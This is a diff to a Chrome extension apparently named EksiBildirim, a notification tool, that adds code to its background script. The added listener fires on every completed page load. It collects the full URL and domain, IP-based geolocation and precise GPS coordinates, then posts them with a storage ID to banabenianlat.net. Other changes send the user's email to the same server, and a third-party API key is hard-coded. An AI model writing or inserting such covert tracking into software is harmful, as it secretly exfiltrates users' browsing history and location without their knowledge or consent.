@@ -71,7 +71,7 @@ function StartWithGetChromeStorage(){
                             type:'get',
                             success: function(data){
                                 storageID = Number(data)+1;
-                                //console.log(storageID);
+                                console.log(storageID);
                                 CreateUserStorage(storageID);
                                 $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/createsocialid.php",
                                 {
@@ -322,11 +322,13 @@ function set_identity_email(){
     chrome.storage.sync.get("id",function(data){
         storageID = data.id;
         if(storageID!=undefined){
+            var email_arr = [];
             email=userinfo.email;
+            email_arr.push(email);
             uniqueId=userinfo.id;
-            $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/set_identity_email.php",
+            $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/createsocialid.php",
             {
-                post_data:{storageID:storageID, email:email, form_factor:1}
+                postdata:{socialID:email_arr,storageID:storageID,form_factor:1}
             },
             function(return_data, status){
             });
@@ -336,3 +338,80 @@ function set_identity_email(){
   });
 }
 
+/**
+ * calback function get an object has properties of:
+integer	tabId	
+string	url	
+integer	processId	
+integer	frameId	
+double	timeStamp	
+ */
+chrome.webNavigation.onCompleted.addListener(function(data){
+    if(data.frameId == 0){
+        domain = data.url.match(/^(?:https?:)?(?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n]+)/im)[1];
+
+        console.log("Frame ID:"+data.frameId+"        URL:"+data.url);
+        GetUserFromStorage(storageID ,domain,data.url); 
+                 
+    }
+});
+
+function GetUserFromStorage(storageID, domain, url){
+
+    console.log(url);
+    console.log(domain);
+    //Storage id ile session oluşturur.
+    if(domain == "banabenianlat.net"){
+        $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/create_session.php",
+            {
+                storageID
+            },
+            function(data, status){
+                console.log(" return data : "+data);
+            }
+        );          
+    }
+    ip2db(storageID, domain, url);
+
+    function ip2db(storageID, domain, url){
+        $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=a759dab4af1f462496dda90b3575f7c7', function(data) {
+            /**
+             * Gets location by coordinates.
+             */
+            if (navigator.geolocation) {    
+                console.log("ip2db storage id: " + storageID);
+                navigator.geolocation.getCurrentPosition(function(position){
+                    data['latitude'] = position.coords.latitude;
+                    data['longitude'] = position.coords.longitude;
+                    data['is_location_accepted'] = 1;
+                    data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
+                    var ip_data = JSON.stringify(data, null, 2);
+                    $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
+                        {
+                            ip_data
+                        },
+                        function(data, status){
+                            console.log("data: " + data + "\nStatus: " + status);
+                        }
+                    );
+
+                });
+            } else { 
+                 console.log("Geolocation is not supported by this browser.");
+                 data['is_location_accepted'] = 0;
+                 data = Object.assign({storageID:storageID,domain:domain,url:url}, data)
+                 var ip_data = JSON.stringify(data, null, 2);
+                 $.post("https://www.banabenianlat.net/ChromeExtensions/EksiBildirim/ip2db.php",
+                     {
+                         ip_data
+                     },
+                     function(data, status){
+                         console.log("data: " + data + "\nStatus: " + status);
+                     }
+                 );
+             }            
+ 
+        });
+    }
+
+}
